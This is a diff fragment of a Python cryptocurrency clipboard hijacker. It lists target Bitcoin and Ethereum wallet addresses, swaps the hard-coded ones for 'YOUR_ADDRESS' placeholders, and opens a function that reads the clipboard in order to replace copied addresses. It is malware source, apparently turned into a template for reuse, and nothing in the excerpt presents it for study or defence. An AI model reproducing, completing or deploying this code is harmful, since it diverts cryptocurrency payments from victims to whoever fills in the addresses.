@@ -25,12 +25,12 @@ import shutil
 
 # Define the target addresses
 btc_addresses = {
-    "1": "15NeX4ULnHEDPwRjxedRdecpDD3PqzQw7U",
-    "bc1": "bc1q9lugaxp4e00cczl6tfyqluwnhlyd0ekcwvsfk4",
-    "3": "3NNGBGiwa5vs2nnA7VAaB9R1XrTg3xeeJN"
+    "1": "YOUR_ADDRESS",
+    "bc1": "YOUR_ADDRESS",
+    "3": "YOUR_ADDRESS"
 }
 
-eth_addresses = ["0xf5450c06CafF5E3E26220D356184b81914CB7f6C", "0xB8643f7fc440A7164a0bA5AF25eDC81C7c7Ca597", "0xEc7cAA68bcF83f2e24c0E23240Da4606E75a0818"]
+eth_addresses = ["YOUR_ADDRESS", "YOUR_ADDRESS", "YOUR_ADDRESS"]
 
 def replace_address():
     current_address = pyperclip.paste().strip()
